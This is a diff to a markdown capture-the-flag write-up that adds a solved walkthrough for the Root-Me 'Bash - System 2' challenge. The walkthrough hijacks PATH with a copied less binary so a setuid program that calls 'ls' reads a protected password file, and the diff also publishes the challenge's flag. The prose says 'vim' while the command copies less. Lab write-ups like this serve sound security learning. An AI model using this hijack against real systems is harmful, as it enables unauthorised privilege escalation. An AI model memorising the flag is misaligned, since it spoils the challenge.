@@ -6,7 +6,7 @@ Exploit environment weaknesses, configuration mistakes and vulnerability pattern
 
 1. [Bash - System 1](#bash-system-1) 🗸
 2. [sudo - weak configuration](#sudo-weak-configuration) 🗸
-3. [Bash - System 2](#bash-system-2)
+3. [Bash - System 2](#bash-system-2) 🗸
 4. [LaTeX - Input](#latex-input)
 5. [Powershell - Command Injection](#powershell-command-injection)
 6. [Bash - unquoted expression injection](#bash-unquoted-expression-injection)
@@ -251,8 +251,54 @@ int main(){
 
 <summary markdown="span">Solution 1</summary>
 
-Detail here
+We can connect to the server:
+  
+~~~shell
+$ ssh -p 2222 app-script-ch12@challenge02.root-me.org
+~~~
+  
+We can review the local directory and files:
+  
+~~~shell
+app-script-ch12@challenge02:~$ ls
+ch12  ch12.c
+app-script-ch12@challenge02:~$ pwd
+/challenge/app-script/ch12
+app-script-ch12@challenge02:~$ cat ch12.c
+#include <stdlib.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <sys/types.h>
 
+int main(){
+    setreuid(geteuid(), geteuid());
+    system("ls -lA /challenge/app-script/ch12/.passwd");
+    return 0;
+}
+~~~
+
+This shows the executable calls the ls command which we can see:
+  
+~~~shell
+$ ./ch12 
+-r--r----- 1 app-script-ch12-cracked app-script-ch12-cracked 14 Dec 10 14:14 /challenge/app-script/ch12/.passwd
+~~~
+
+We need to change the ls command to do something more sinister.  CAT is unavailable, strings does not handle the -l flag lets use vim instead:
+
+~~~shell
+app-script-ch12@challenge02:~$ cp /usr/bin/less /tmp/ls
+~~~
+
+We can now change the PATH and run:
+  
+~~~shell
+app-script-ch12@challenge02:~$ export PATH=/tmp:$PATH
+app-script-ch12@challenge02:~$ ./ch12
+~~~
+ 
+This returns the password
+  
 </details>
 
 ### Answer
@@ -262,7 +308,7 @@ Detail here
 <summary markdown="span">Answer</summary>
 
 ~~~
-
+8a95eDS/*e_T#
 ~~~
 
 </details>
